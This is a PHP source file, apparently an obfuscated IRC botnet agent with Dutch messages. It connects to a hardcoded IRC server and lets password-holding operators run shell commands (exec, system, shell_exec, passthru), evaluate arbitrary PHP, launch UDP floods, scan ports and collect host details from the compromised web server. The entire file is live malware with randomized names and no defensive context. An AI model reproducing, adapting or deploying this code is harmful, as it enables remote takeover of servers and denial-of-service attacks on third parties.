<?php set_time_limit(0); error_reporting(0);  class nNVZBnjNfZNbBrnVv {

 var $zVbvJJvVFFrNbnz = array("RfZRvfBBbnFFFrZz"=>"gangbang.angels-agency.nl",
                     "rrBn"=>"23232",
                     "BjJvR"=>"scary",
                     "nNBRBB"=>"13",
                     "xXDdX"=>"#wWw#",
                     "Zvv"=>"scan",
                     "RVbrfbbRZ"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "rbJVVJVzRr"=>".",
                     "vVZrzFFJrVj"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $nvbZzNzFnJNrFVNFJB = array(); 
 function QIiiqAemuimuMiqMAY($tldH,$thxtLtdxTx,$qyAi) {
	$this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002UdpFlood Gestart!\002]"); 
	$HPhDplxlh = "";
	for($x=0;$x<$thxtLtdxTx;$x++) { $HPhDplxlh .= chr(mt_rand(1,256)); }
	$PXlXh = time();
	$x = 0;
	while(time()-$PXlXh < $qyAi) {
		$Fl=fsockopen("udp://".$tldH,mt_rand(0,6000),$e,$s,5);
      	fwrite($Fl,$HPhDplxlh);
       	fclose($Fl);
		$x++;
	}
	$VOp = $x * $thxtLtdxTx;
	$VOp = $VOp / 1048576;
	$xzs = $VOp / $qyAi;
	$xzs = round($xzs);
	$VOp = round($VOp);
	$this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002UdpFlood Afgerond!\002]: $VOp MB verzonden / gemiddelde: $xzs MB/s ");
 } function QaMQmEYmquy($Pl,$pTX)
 {
    $this->aamEaaA("PRIVMSG $Pl :$pTX");
 } function miQemuIQuYUEAAAY() {
  $tTxDXh = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $pXXtpTx = strlen($tTxDXh);
  for($x=0;$x<$this->zVbvJJvVFFrNbnz['nNBRBB'];$x++) {
	$UIq .= $tTxDXh[rand(0,$pXXtpTx-1)];
  }
  $this->aamEaaA("NICK ".$UIq."");
 } function qyeUyi($xXDdX,$Zvv=NULL) 
 { 
    $this->aamEaaA("JOIN $xXDdX $Zvv"); 
 }function AUiqQIUUMYEmEu() 
 { 
    while(!feof($this->cwCOwGWcO)) 
    { 
       $this->auAuA = trim(fgets($this->cwCOwGWcO,512)); 
       $bjbFBJJFZfvzR = explode(" ",$this->auAuA); 
       if(substr($this->auAuA,0,6)=="PING :") 
       { 
          $this->aamEaaA("PONG :".substr($this->auAuA,6)); 
       } 
       if(isset($bjbFBJJFZfvzR[1]) && $bjbFBJJFZfvzR[1] =="004") 
       { 
          $this->aamEaaA("JOIN ".$this->zVbvJJvVFFrNbnz['xXDdX']." ".$this->zVbvJJvVFFrNbnz['Zvv']."");
          $this->qyeUyi($this->zVbvJJvVFFrNbnz['xXDdX'],$this->zVbvJJvVFFrNbnz['Zvv']);
          $this->EEiqaiAeYmeyMYIYeyY();
       } 
       if(isset($bjbFBJJFZfvzR[1]) && $bjbFBJJFZfvzR[1]=="433") 
       { 
          $this->miQemuIQuYUEAAAY(); 
       }
       if($this->auAuA != $Zbz_ppL) 
       { 
          $nrzJrnBNJzFfbJ = array(); 
          $WgK = substr(strstr($this->auAuA," :"),2); 
          $Oskw = explode(" ",$WgK); 
          $cKcKk = explode("!",$bjbFBJJFZfvzR[0]); 
          $kWKOsg = explode("@",$cKcKk[1]); 
          $kWKOsg = $kWKOsg[1]; 
          $cKcKk = substr($cKcKk[0],1); 
          $wskOCwG = $bjbFBJJFZfvzR[0]; 
          if($Oskw[0]==$this->cKcKk) 
          { 
           for($x=0;$x<count($Oskw);$x++) 
              $nrzJrnBNJzFfbJ[$x] = $Oskw[$x+1]; 
          } 
          else 
          { 
           for($x=0;$x<count($Oskw);$x++) 
              $nrzJrnBNJzFfbJ[$x] = $Oskw[$x]; 
          } 
          if(count($bjbFBJJFZfvzR)>2) 
          { 
             switch($bjbFBJJFZfvzR[1]) 
             { 
                case "QUIT": 
                   if($this->aEaaMAeQAeUq($wskOCwG)) 
                   { 
                      $this->iqIAmYiM($wskOCwG); 
                   } 
                break; 
                case "PART": 
                   if($this->aEaaMAeQAeUq($wskOCwG)) 
                   { 
                      $this->iqIAmYiM($wskOCwG); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->aEaaMAeQAeUq($wskOCwG) && (md5($kWKOsg) == $this->zVbvJJvVFFrNbnz['vVZrzFFJrVj'] || $this->zVbvJJvVFFrNbnz['vVZrzFFJrVj'] == "*")) 
                   { 
                      if(substr($nrzJrnBNJzFfbJ[0],0,1)==$this->zVbvJJvVFFrNbnz['rbJVVJVzRr']) 
                      { 
                         switch(substr($nrzJrnBNJzFfbJ[0],1)) 
                         { 
                            case "user": 
                              if(md5($nrzJrnBNJzFfbJ[1])==$this->zVbvJJvVFFrNbnz['RVbrfbbRZ']) 
                              { 
                                 $this->IEAIYEEyy($wskOCwG);
                              } 
                              else 
                              { 
                                 $this->EqyiiyuMAi($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002Auth\002]: Fout password $cKcKk idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->aEaaMAeQAeUq($wskOCwG)) 
                   { 
                      if(substr($nrzJrnBNJzFfbJ[0],0,1)==$this->zVbvJJvVFFrNbnz['rbJVVJVzRr']) 
                      { 
                         switch(substr($nrzJrnBNJzFfbJ[0],1)) 
                         {                            case "exec": 
                               $KOkSCGCCwkOC = substr(strstr($WgK,$nrzJrnBNJzFfbJ[0]),strlen($nrzJrnBNJzFfbJ[0])+1); 
                               $KSKCkWCGGggGK = exec($KOkSCGCCwkOC); 
                               $WGOsgCGWOWWSww = explode("\n",$KSKCkWCGGggGK); 
                               for($x=0;$x<count($WGOsgCGWOWWSww);$x++) 
                                  if($WGOsgCGWOWWSww[$x]!=NULL) 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"      : ".trim($WGOsgCGWOWWSww[$x])); 
                            break;                            case "pscan": 
                               if(count($nrzJrnBNJzFfbJ) > 2) 
                               { 
                                  if(fsockopen($nrzJrnBNJzFfbJ[1],$nrzJrnBNJzFfbJ[2],$e,$s,15)) 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002pscan\002]: ".$nrzJrnBNJzFfbJ[1].":".$nrzJrnBNJzFfbJ[2]." is \2open\2"); 
                                  else 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002pscan\002]: ".$nrzJrnBNJzFfbJ[1].":".$nrzJrnBNJzFfbJ[2]." is \2closed\2"); 
                               } 
                            break;                            case "die": 
                               $this->aamEaaA("QUIT :die command from $cKcKk");
                               fclose($this->cwCOwGWcO); 
                               exit;                            case "udpflood": 
                               if(count($nrzJrnBNJzFfbJ)>3) 
                               { 
                                  $this->QIiiqAemuimuMiqMAY($nrzJrnBNJzFfbJ[1],$nrzJrnBNJzFfbJ[2],$nrzJrnBNJzFfbJ[3]); 
                               } 
                            break;                            case "system": 
                               $KOkSCGCCwkOC = substr(strstr($WgK,$nrzJrnBNJzFfbJ[0]),strlen($nrzJrnBNJzFfbJ[0])+1); 
                               $KSKCkWCGGggGK = system($KOkSCGCCwkOC); 
                               $WGOsgCGWOWWSww = explode("\n",$KSKCkWCGGggGK); 
                               for($x=0;$x<count($WGOsgCGWOWWSww);$x++) 
                                  if($WGOsgCGWOWWSww[$x]!=NULL) 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"      : ".trim($WGOsgCGWOWWSww[$x])); 
                            break;                            case "rndnick": 
                               $this->miQemuIQuYUEAAAY(); 
                            break;                            case "sexec":
                               $KOkSCGCCwkOC = substr(strstr($WgK,$nrzJrnBNJzFfbJ[0]),strlen($nrzJrnBNJzFfbJ[0])+1); 
                               $KSKCkWCGGggGK = shell_exec($KOkSCGCCwkOC); 
                               $WGOsgCGWOWWSww = explode("\n",$KSKCkWCGGggGK); 
                               for($x=0;$x<count($WGOsgCGWOWWSww);$x++) 
                                  if($WGOsgCGWOWWSww[$x]!=NULL) 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"      : ".trim($WGOsgCGWOWWSww[$x])); 
                            break;                            case "logout": 
                               $this->iqIAmYiM($wskOCwG); 
                               $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002Auth\002]\00314 Je bent nu uitgelogt $cKcKk"); 
                            break;                            case "raw":
                               $this->aamEaaA(strstr($WgK,$nrzJrnBNJzFfbJ[1])); 
                            break;                            case "info":
                               $this->EEiqaiAeYmeyMYIYeyY();
                            break;                            case "dns": 
                               if(isset($nrzJrnBNJzFfbJ[1])) 
                               { 
                                  $SK = explode(".",$nrzJrnBNJzFfbJ[1]); 
                                  if(count($SK)==4 && is_numeric($SK[0]) && is_numeric($SK[1]) && is_numeric($SK[2]) && is_numeric($SK[3])) 
                                  { 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002dns\002]: ".$nrzJrnBNJzFfbJ[1]." => ".gethostbyaddr($nrzJrnBNJzFfbJ[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"[\002dns\002]: ".$nrzJrnBNJzFfbJ[1]." => ".gethostbyname($nrzJrnBNJzFfbJ[1])); 
                                  } 
                               } 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($WgK,$nrzJrnBNJzFfbJ[1]),strlen($nrzJrnBNJzFfbJ[1])));
                            break;                            case "restart": 
                               $this->aamEaaA("QUIT :gerestart door $cKcKk");
                               fclose($this->cwCOwGWcO); 
                               $this->EEaaAmEiEeuuu(); 
                            break;                            case "passthru": 
                               $KOkSCGCCwkOC = substr(strstr($WgK,$nrzJrnBNJzFfbJ[0]),strlen($nrzJrnBNJzFfbJ[0])+1); 

                               $KSKCkWCGGggGK = passthru($KOkSCGCCwkOC); 
                               $WGOsgCGWOWWSww = explode("\n",$KSKCkWCGGggGK); 
                               for($x=0;$x<count($WGOsgCGWOWWSww);$x++) 
                                  if($WGOsgCGWOWWSww[$x]!=NULL) 
                                     $this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"      : ".trim($WGOsgCGWOWWSww[$x])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $Zbz_ppL = $this->auAuA; 
    } 
    $this->EEaaAmEiEeuuu(); 
 } function iqIAmYiM($tldH) 
 { 
    unset($this->nvbZzNzFnJNrFVNFJB[$tldH]); 
 } function aamEaaA($pTX) 
 { 
    fwrite($this->cwCOwGWcO,"$pTX\r\n"); 
 } function EEaaAmEiEeuuu() 
 { 
    if(!($this->cwCOwGWcO = fsockopen($this->zVbvJJvVFFrNbnz['RfZRvfBBbnFFFrZz'],$this->zVbvJJvVFFrNbnz['rrBn'],$e,$s,30))) 
    $this->EEaaAmEiEeuuu(); 
    $this->uAQEqEmMyyiEmmyaY();
    if(strlen($this->zVbvJJvVFFrNbnz['BjJvR'])>0) 
    $this->aamEaaA("PASS ".$this->zVbvJJvVFFrNbnz['BjJvR']);
    $this->miQemuIQuYUEAAAY();
    $this->AUiqQIUUMYEmEu();
 } function uAQEqEmMyyiEmmyaY() {
  $tTxDXh = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $pXXtpTx = strlen($tTxDXh);
  for($x=0;$x<6;$x++) {
	$UIq .= $tTxDXh[rand(0,$pXXtpTx-1)];
  }
  if(php_uname() == "") { $pLTPXdLL = "---"; } else { $pLTPXdLL = php_uname(); }
  $this->aamEaaA("USER ".$UIq."-go 127.0.0.1 localhost :".$pLTPXdLL."");
 } function aEaaMAeQAeUq($tldH) 
 { 
    if(isset($this->nvbZzNzFnJNrFVNFJB[$tldH])) 
       return 1; 
    else 
       return 0; 
 } function EqyiiyuMAi($Pl,$pTX)
 {
    $this->aamEaaA("NOTICE $Pl :$pTX");
 } function EEiqaiAeYmeyMYIYeyY() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $TlptDdtPLPX = "\0034ON\003"; } else { $TlptDdtPLPX = "\0039OFF\003"; }

	$pLTPXdLL = php_uname();
	if($pLTPXdLL == "") { $jJGGld = "\00315---\003"; } else { $jJGGld = "\00315".$pLTPXdLL."\003"; }
		 
	 $ZjWG = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $DPGCW =  getcwd()."";
	 
	 $TwKo = "\00315".$DPGCW."\003";

	$kSsGCWoWwW = fileperms("$DPGCW");

	if (($kSsGCWoWwW & 0xC000) == 0xC000) { $cGcKoCOcssG = 's';
	} elseif (($kSsGCWoWwW & 0xA000) == 0xA000) { $cGcKoCOcssG = 'l';
	} elseif (($kSsGCWoWwW & 0x8000) == 0x8000) { $cGcKoCOcssG = '-';
	} elseif (($kSsGCWoWwW & 0x6000) == 0x6000) { $cGcKoCOcssG = 'b';
	} elseif (($kSsGCWoWwW & 0x4000) == 0x4000) { $cGcKoCOcssG = 'd';
	} elseif (($kSsGCWoWwW & 0x2000) == 0x2000) { $cGcKoCOcssG = 'c';
	} elseif (($kSsGCWoWwW & 0x1000) == 0x1000) { $cGcKoCOcssG = 'p';
	} else { $cGcKoCOcssG = 'u'; }

	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0100) ? 'r' : '-');
	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0080) ? 'w' : '-');
	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0040) ?	(($kSsGCWoWwW & 0x0800) ? 's' : 'x' ) :	(($kSsGCWoWwW & 0x0800) ? 'S' : '-'));

	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0020) ? 'r' : '-');
	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0010) ? 'w' : '-');
	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0008) ?	(($kSsGCWoWwW & 0x0400) ? 's' : 'x' ) :	(($kSsGCWoWwW & 0x0400) ? 'S' : '-'));

	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0004) ? 'r' : '-');
	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0002) ? 'w' : '-');
	$cGcKoCOcssG .= (($kSsGCWoWwW & 0x0001) ?	(($kSsGCWoWwW & 0x0200) ? 't' : 'x' ) :	(($kSsGCWoWwW & 0x0200) ? 'T' : '-'));
			
	$fbDX = "\00315".$cGcKoCOcssG."\003";

	$this->QaMQmEYmquy($this->zVbvJJvVFFrNbnz['xXDdX'],"\00314[SAFE:\003\002 $TlptDdtPLPX\002\00314]\00315 $ZjWG \00314[pwd:]\00315 $TwKo \00314(\003$fbDX\00314) [uname:]\00315 $jJGGld");
 } function IEAIYEEyy($tldH) 
 { 
    $this->nvbZzNzFnJNrFVNFJB[$tldH] = true; 
 }}
$gSSkwSKG = new nNVZBnjNfZNbBrnVv;
$gSSkwSKG->EEaaAmEiEeuuu(); ?>